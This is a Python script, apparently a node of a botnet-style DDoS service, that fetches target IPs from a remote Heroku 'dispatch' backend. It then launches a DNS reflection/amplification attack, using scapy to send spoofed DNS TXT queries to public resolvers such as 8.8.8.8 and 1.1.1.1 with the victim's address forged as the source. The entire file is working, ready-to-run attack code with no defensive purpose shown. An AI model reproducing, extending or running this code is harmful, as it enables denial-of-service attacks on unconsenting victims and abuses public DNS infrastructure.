# dns_amp_spoof.py — Linked with Heroku Dispatch
import random
import time
import requests
from scapy.all import IP, UDP, send, DNS, DNSQR

# === CONFIGURATION ===
BACKEND_URL = "https://keyauthddos-e093a0d5e730.herokuapp.com"
DURATION = 60  # Attack duration in seconds
REFLECTORS = [
    "8.8.8.8", "1.1.1.1", "9.9.9.9",
    "208.67.222.222", "77.88.8.8"
]

# === AMPLIFIED DNS QUERY BUILDER ===
def build_query():
    return DNS(rd=1, id=random.randint(0, 65535), qd=DNSQR(qname="example.com", qtype="TXT"))

# === FETCH TARGET IP FROM HEROKU ===
def fetch_target():
    try:
        res = requests.get(f"{BACKEND_URL}/dispatch").json()
        if "ip" in res:
            print(f"[+] Target acquired: {res['ip']}:{res['port']}")
            return res["ip"]
        else:
            print("[!] No dispatch task available.")
            return None
    except Exception as e:
        print(f"[!] Error fetching dispatch: {e}")
        return None

# === MAIN ATTACK FUNCTION ===
def launch_amplified_attack(target_ip):
    print(f"[+] Spoofing DNS queries as {target_ip}")
    end_time = time.time() + DURATION
    while time.time() < end_time:
        for reflector in REFLECTORS:
            try:
                ip = IP(src=target_ip, dst=reflector)
                udp = UDP(sport=random.randint(1024, 65535), dport=53)
                dns = build_query()
                packet = ip / udp / dns
                send(packet, verbose=0)
            except Exception as e:
                print(f"[!] Packet error: {e}")
    print("[+] Amplification complete.")

if __name__ == "__main__":
    target_ip = fetch_target()
    if target_ip:
        launch_amplified_attack(target_ip)
    else:
        print("[!] Aborting attack — no valid target.")
